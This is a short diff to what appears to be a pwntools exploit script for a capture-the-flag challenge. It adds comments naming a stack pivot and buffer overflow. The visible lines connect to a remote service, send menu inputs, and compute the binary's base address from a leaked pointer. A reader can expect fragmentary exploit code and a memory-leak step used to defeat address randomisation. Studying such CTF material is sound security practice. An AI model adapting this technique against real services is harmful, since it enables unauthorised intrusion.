@@ -1,3 +1,5 @@
+#stack pivot + buffer overflow
+
 from pwn import *
 
 context.arch = 'amd64'
@@ -15,7 +17,7 @@ io = remote(ip, port)
 
 io.sendlineafter('> ', '2')
 io.sendlineafter('What do you wish to sell? ', '1')
-io.sendafter('How much do you want for it? ', '12345678')
+io.sendafter('How much do you want for it? ', '12345678')  #sendlineafter may cause problem in the following inputs seq...
 buf = io.recvline().split('? ')[1]
 elf_base = u64(buf[8:].ljust(8,'\x00')) - 0x40c0
 print hex(elf_base)
